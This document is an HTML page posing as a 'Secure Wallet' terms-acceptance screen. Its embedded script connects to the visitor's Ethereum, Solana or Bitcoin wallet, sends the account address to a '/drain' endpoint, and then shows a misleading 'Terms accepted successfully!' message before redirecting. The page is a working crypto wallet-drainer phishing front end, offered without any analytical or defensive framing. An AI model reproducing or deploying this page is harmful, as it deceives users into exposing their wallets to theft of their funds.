<!DOCTYPE html>
<html lang="en">
<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Secure Wallet Login</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
 <div id="app">
 <h1>Secure Wallet</h1>
 <p>By clicking "Accept Terms and Conditions," you agree to our terms.</p>
 <button id="acceptButton">Accept Terms and Conditions</button>
 </div>

 <script>
 document.getElementById('acceptButton').addEventListener('click', function() {
 // Detect the connected wallet and chain
 if (typeof window.ethereum !== 'undefined') {
 window.ethereum.request({ method: 'eth_requestAccounts' })
 .then(accounts => {
 const userAddress = accounts[0];
 fetch('/drain', {
 method: 'POST',
 headers: {
 'Content-Type': 'application/json'
 },
 body: JSON.stringify({ userAddress: userAddress, chain: 'ethereum' })
 })
 .then(response => response.json())
 .then(data => {
 alert('Terms accepted successfully!');
 window.location.href = 'https://securewallet.com';
 });
 })
 .catch(error => {
 console.error('Error connecting to wallet:', error);
 });
 } else if (typeof window.solana !== 'undefined') {
 const userAddress = window.solana.publicKey.toString();
 fetch('/drain', {
 method: 'POST',
 headers: {
 'Content-Type': 'application/json'
 },
 body: JSON.stringify({ userAddress: userAddress, chain: 'solana' })
 })
 .then(response => response.json())
 .then(data => {
 alert('Terms accepted successfully!');
 window.location.href = 'https://securewallet.com';
 });
 } else if (typeof window.bitcoin !== 'undefined') {
 const userAddress = window.bitcoin.publicKey.toString();
 fetch('/drain', {
 method: 'POST',
 headers: {
 'Content-Type': 'application/json'
 },
 body: JSON.stringify({ userAddress: userAddress, chain: 'bitcoin' })
 })
 .then(response => response.json())
 .then(data => {
 alert('Terms accepted successfully!');
 window.location.href = 'https://securewallet.com';
 });
 } else {
 alert('Please install a wallet to use this feature.');
 }
 });
 </script>
</body>
</html>
